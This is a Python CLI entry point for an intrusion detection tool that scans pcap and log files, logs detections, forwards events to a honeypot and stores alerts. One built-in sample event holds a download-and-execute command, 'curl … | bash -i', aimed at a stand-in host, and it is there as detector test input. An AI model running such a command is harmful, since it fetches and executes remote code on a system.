"""
main.py — CLI entry point for file-based detection.

Usage:
    python -m app.main                   # run on built-in sample events
    python -m app.main capture.pcap      # run on a pcap
    python -m app.main /var/log/auth.log # run on a log file
"""

from __future__ import annotations

import logging
import sys
import time
from pathlib import Path

from app.detector import IDSDetector
from app.honeypot import maybe_forward_to_honeypot
from app.logging_config import setup_logging
from app.schemas import LogEvent
from app.storage import init_db, store_alert
from app.dataloader import load_pcap_events, load_text_log_events

logger = logging.getLogger(__name__)


def run_sample_mode(detector: IDSDetector) -> None:
    sample_events = [
        LogEvent(time.time(), "192.168.1.50", "server1", "ssh",
                 "Failed password for invalid user admin"),
        LogEvent(time.time(), "10.0.0.15", "server2", "web",
                 "curl http://evil.example/payload.sh | bash -i"),
        LogEvent(time.time(), "127.0.0.1", "server3", "cron",
                 "trusted_update completed successfully"),
    ]

    for event in sample_events:
        _process(detector, event)


def run_file_mode(detector: IDSDetector, input_path: str) -> None:
    path = Path(input_path)
    if not path.exists():
        raise FileNotFoundError(f"Input path not found: {input_path}")

    suffix = path.suffix.lower()
    if suffix in {".pcap", ".pcapng"}:
        events = load_pcap_events(path)
    elif suffix in {".log", ".txt"}:
        events = load_text_log_events(path)
    else:
        raise ValueError("Detection input must be a .pcap, .pcapng, .log, or .txt file.")

    logger.info("file_mode_loaded", extra={"path": str(path), "event_count": len(events)})

    for event in events:
        _process(detector, event)


def _process(detector: IDSDetector, event: LogEvent) -> None:
    result = detector.predict_event(event)

    log_extra = {
        "source_ip": result.source_ip,
        "hostname": result.hostname,
        "label": result.predicted_label,
        "severity": result.severity,
        "confidence": round(result.confidence, 3),
        "flags": result.rule_flags,
        "deduplicated": result.deduplicated,
    }

    if result.predicted_label == "malicious":
        logger.warning("detection_malicious", extra=log_extra)
    elif result.predicted_label == "suspicious":
        logger.warning("detection_suspicious", extra=log_extra)
    else:
        logger.debug("detection_benign", extra=log_extra)

    forwarded = maybe_forward_to_honeypot(result)

    if result.predicted_label != "benign" and not result.deduplicated:
        store_alert(result, honeypot_sent=forwarded)


def main() -> None:
    setup_logging()
    init_db()
    detector = IDSDetector()

    if len(sys.argv) > 1:
        run_file_mode(detector, sys.argv[1])
    else:
        run_sample_mode(detector)


if __name__ == "__main__":
    main()
